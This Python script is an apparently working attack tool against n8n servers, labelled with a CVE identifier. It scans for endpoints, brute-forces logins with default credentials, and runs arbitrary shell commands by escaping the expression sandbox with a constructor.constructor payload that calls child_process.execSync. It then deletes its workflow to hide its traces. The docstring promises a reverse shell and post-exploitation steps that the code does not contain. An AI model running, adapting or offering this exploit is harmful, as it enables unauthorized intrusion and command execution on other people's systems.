#!/usr/bin/env python3
"""
CVE-2025-68613 - n8n Advanced Kill Chain (DissectX)
===================================================
A unified Kill Chain tool for n8n exploitation:
1. RECON: Fuzzes for hidden endpoints/versions
2. CRACK: Multi-threaded credential brute-forcing (Hydra-style)
3. EXPLOIT: Sandboxed RCE + Reverse Shell
4. POST: System enumeration

Author: DissectX Algorithm
"""

import argparse
import requests
import json
import sys
import time
import base64
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from queue import Queue

# Disable warnings
requests.packages.urllib3.disable_warnings()

BANNER = """
╔═══════════════════════════════════════════════════════════╗
║ DissectX | n8n Kill Chain (CVE-2025-68613)                ║
║ > Recon | Crack | Exploit | Post                          ║
╚═══════════════════════════════════════════════════════════╝
"""

class N8nKillChain:
    def __init__(self, url, email=None, password=None, wordlist=None, verify_ssl=False):
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        parsed = urlparse(url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        self.email = email
        self.password = password
        self.wordlist = wordlist
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.token = None
        
        # Wordlists
        self.default_users = ["admin@admin.com", "admin@n8n.io", "user@n8n.io", "admin@example.com", "n8n@n8n.io", "root@localhost"]
        self.default_pass = ["password", "admin", "123456", "n8n", "password123", "admin123"]

    def log(self, msg, level="info"):
        symbols = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{symbols.get(level, '[*]')} {msg}")

    # --- PHASE 1: RECON ---
    def active_recon(self):
        self.log("PHASE 1: RECON - Enumerating Endpoints", "info")
        paths = ["/", "/healthz", "/api/v1/health", "/rest/settings", "/rest/login", "/dashboard"]
        found = []
        
        for p in paths:
            try:
                r = self.session.get(f"{self.base_url}{p}", timeout=5)
                if r.status_code < 404:
                    self.log(f"Found: {p} (Status: {r.status_code})", "success")
                    found.append(p)
                    if "n8n" in r.text.lower():
                        self.log(f"Confirmed n8n instance at {p}", "success")
                elif r.status_code == 401:
                    self.log(f"Auth Required at {p} (Good Target)", "warning")
            except: pass
        return len(found) > 0

    # --- PHASE 2: CRACK ---
    def brute_force(self):
        self.log("PHASE 2: CRACK - Starting Multi-threaded Brute Force", "info")
        
        # Generator for combos
        combos = []
        if self.wordlist:
            # TODO: Add file reading for heavy wordlists
            pass
        else:
            # Generate cartesian product of defaults
            for u in self.default_users:
                for p in self.default_pass:
                    combos.append((u, p))
                    
        self.log(f"Loaded {len(combos)} credentials to spray...", "info")
        
        found_creds = None
        stop_event = threading.Event()
        
        def worker(creds):
            nonlocal found_creds
            if stop_event.is_set(): return
            u, p = creds
            try:
                # Login logic
                r = requests.post(
                    f"{self.base_url}/rest/login", 
                    json={"email": u, "password": p},
                    verify=self.verify_ssl,
                    timeout=5
                )
                if r.status_code == 200:
                    data = r.json()
                    tok = data.get('data', {}).get('apiKey') or data.get('apiKey')
                    if tok or 'n8n-auth' in r.cookies:
                        self.log(f"CRACKED! {u}:{p}", "success")
                        found_creds = (u, p)
                        stop_event.set()
            except: pass

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(worker, combos)
            
        if found_creds:
            self.email, self.password = found_creds
            return self.authenticate()
        else:
            self.log("Brute force failed. Attempting Unauth Bypass...", "warning")
            return True # Proceed to try unauth

    def authenticate(self):
        r = self.session.post(f"{self.base_url}/rest/login", json={"email": self.email, "password": self.password})
        if r.status_code == 200:
            data = r.json()
            self.token = data.get('data', {}).get('apiKey') or data.get('apiKey')
            if not self.token and 'n8n-auth' in self.session.cookies:
                self.token = self.session.cookies['n8n-auth']
            if self.token:
                self.session.headers.update({'Authorization': f'Bearer {self.token}'})
                return True
        return False

    # --- PHASE 3: EXPLOIT ---
    def execute_payload(self, expression):
        workflow = {
            "nodes": [{
                "parameters": { "values": { "string": [{ "name": "result", "value": f"={{{expression}}}" }] } },
                "name": "Exploit",
                "type": "n8n-nodes-base.set",
                "typeVersion": 2,
                "position": [250, 300]
            }],
            "connections": {}
        }
        
        # Try Authenticated Execution First
        created_id = None
        if self.token:
            try:
                # Create
                r = self.session.post(f"{self.base_url}/rest/workflows", json=workflow)
                if r.status_code == 200:
                    created_id = r.json()['id']
                    # Run
                    r = self.session.post(f"{self.base_url}/rest/workflows/{created_id}/run", json={})
                    if r.status_code == 200:
                        return self._parse_output(r.json())
            except: pass
            finally:
                if created_id: # Cleanup
                    self.session.delete(f"{self.base_url}/rest/workflows/{created_id}")

        # Fallback: Unauthenticated Ephemeral
        try:
            r = self.session.post(f"{self.base_url}/rest/workflows/run", json={"workflowData": workflow})
            if r.status_code == 200:
                return self._parse_output(r.json())
            elif r.status_code == 401:
                self.log("Target blocked Unauth Execution.", "error")
        except: pass
        return None

    def _parse_output(self, data):
        try:
            return data['data']['resultData']['runData']['Exploit'][0]['data']['main'][0][0]['json']['result']
        except: return str(data)

    def run_cmd(self, cmd):
        self.log(f"PHASE 3: EXPLOIT - Executing '{cmd}'", "info")
        payload = f"this.constructor.constructor('return require(\"child_process\").execSync(\"{cmd}\").toString()')()"
        res = self.execute_payload(payload)
        if res:
            print(f"\n[+] OUTPUT:\n{res.strip()}\n")
            return True
        return False

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', '-t', required=True)
    parser.add_argument('-e', '--email')
    parser.add_argument('-p', '--password')
    parser.add_argument('-c', '--command', default='id')
    args = parser.parse_args()

    kc = N8nKillChain(args.url, args.email, args.password)
    
    # 1. Recon
    kc.active_recon()
    
    # 2. Auth (Crack if needed)
    if not (kc.email and kc.password):
        if not kc.brute_force():
            pass # Continue to unauth attempt
    else:
        kc.authenticate()

    # 3. Exploit
    kc.run_cmd(args.command)

if __name__ == "__main__":
    main()
